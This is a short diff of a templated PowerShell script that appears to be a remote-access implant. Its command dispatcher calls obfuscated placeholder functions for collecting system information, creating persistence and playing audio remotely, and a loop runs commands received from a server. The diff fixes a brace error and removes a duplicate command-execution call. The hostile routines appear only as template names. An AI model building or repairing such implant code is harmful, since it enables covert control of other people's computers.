@@ -80,7 +80,7 @@ function {{ ron.obf_builtin_command }}($data){
         {{ ron.obf_collect_sysinfo }}
     } elseif ($a -eq "EP"){
         {{ ron.obf_create_persistence }}
-    {elseif ($a -eq "PS"){
+    } elseif ($a -eq "PS"){
         {{ ron.obf_remote_play_audio }}($b)
     } else {
         $Script:tr = "0"
@@ -175,7 +175,6 @@ while($true){
         $_.Exception | format-list -Force
     }
     if ( $headers -NotLike "=="){
-        execute_command($headers)
         {{ ron.obf_builtin_command }}($headers)
         $atr = $tr -join "`n"
         $plh = $atr
